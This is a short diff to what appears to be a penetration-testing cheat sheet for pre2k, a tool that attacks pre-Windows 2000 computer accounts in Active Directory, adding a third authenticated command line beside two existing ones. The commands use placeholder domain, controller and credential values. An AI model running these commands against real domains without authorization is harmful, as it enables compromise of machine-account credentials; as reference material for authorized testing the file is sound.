@@ -1,3 +1,4 @@
 # pre2k — Pre-Windows 2000 computer account exploitation
 pre2k auth -d $DOMAIN -dc-ip $DC_IP -u $USER -p $PASSWORD
 pre2k unauth -d $DOMAIN -dc-ip $DC_IP -inputfile computers.txt
+pre2k auth -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $DC_HOST -verbose
